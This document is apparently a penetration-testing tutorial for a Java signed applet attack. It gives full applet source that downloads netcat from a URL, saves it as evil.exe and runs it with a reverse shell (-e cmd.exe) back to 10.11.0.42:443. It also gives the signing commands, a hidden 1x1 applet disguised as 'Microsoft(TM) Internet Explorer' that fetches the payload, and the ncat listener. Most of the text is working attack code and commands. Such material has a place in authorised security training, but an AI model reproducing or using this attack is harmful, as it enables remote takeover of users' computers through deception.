Java Signed Applet Attack
================================================================================

We target users on systems with Java installed and enabled in their browsers, who willclick 'Run' on the Java applet warning box.### [1] Write it.

We create a java file that, when run by the victim, downloads an executable and executes it in a temporary directory on the victim machine. In this story we choose netcat as the file to download, and we include the necessary reverse connection parameters right in the java file.```root@kali:~# vim Java.java
```

```import java.applet.*; 
import java.awt.*; 
import java.io.*; 
import java.net.URL; 
import java.util.*;

/*
 * Author: Offensive Security (<-- thanks for the great training)
 * This Java applet will download a file and execute it. 
 */

public class Java extends Applet {

  private Object initialized = null; 
  public Object isInitialized()
  {
    return initialized;
  }
  public void init() {
    Process f;
  try {
  String tmpdir = System.getProperty("java.io.tmpdir") + File.separator; 
  String expath = tmpdir + "evil.exe";
  String download = "";
  download = getParameter("1");
  if (download.length() > 0) { 
    // URL parameter
    URL url = new URL(download);
    // Get an input stream for reading
    InputStream in = url.openStream();
    // Create a buffered input stream for efficency
    BufferedInputStream bufIn = new BufferedInputStream(in); 
    File outputFile = new File(expath);
    OutputStream out = new BufferedOutputStream(new FileOutputStream(outputFile));
    byte[] buffer = new byte[2048];
    for (;;) {
      int nBytes = bufIn.read(buffer); 
      if (nBytes <= 0) break;
        out.write(buffer, 0, nBytes); 
      }
      out.flush(); 
      out.close(); 
      in.close();
      // Below line to simply execute file
      //f = Runtime.getRuntime().exec("cmd.exe /c " + expath);
      // Below line to execute file with reverse connection parameters (netcat)
      f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " 10.11.0.42 443 -e cmd.exe");
    }
  } catch(IOException e) { 
      e.printStackTrace();
  }
  /* ended here and commented out below for bypass */ 
  catch (Exception exception)
  {
    exception.printStackTrace();
  }
}
}
```

### [2] Compile it.

We then compile our code with the Java compiler and sign our applet.```
root@kali:~# javac -source 1.7 -target 1.7 Java.javaroot@kali:~# echo "Permissions: all-permissions" > /root/manifest.txtroot@kali:~# jar cvf Java.jar Java.class  added manifest  adding: Java.class(in = 1233) (out= 709)(deflated 42%)root@kali:~# keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123  What is your first and last name?  ...root@kali:~# jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet
```
### [3] Copy jar and supporting files.

We copy the signed jar file to our /var/www/html/ directory.

```root@kali:~# cp Java.class SignedJava.jar /var/www/html/
```
Also in the /var/www/html/ directory, we create an HTML file with the applet embeddedin it. (Below is all a single command on a single, continuous line.)

```
root@kali:~# echo '<applet width="1" height="1" id="Microsoft(TM) Internet Explorer" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://10.11.0.42:80/nc.exe"></applet>' > /var/www/html/java.html
```
Lastly, we copy nc.exe to the same web root directory and ensure it has the same nameas referenced in the Java file.

```root@kali:~# cp /usr/share/windows-binaries/nc.exe /var/www/html/nc.exe
```
### [4] Attack.

Then we wait with a listener for the victim to navigate to our page and agree to runour Java applet.

```
root@kali:~# ncat -nvlp 443
```

<br>
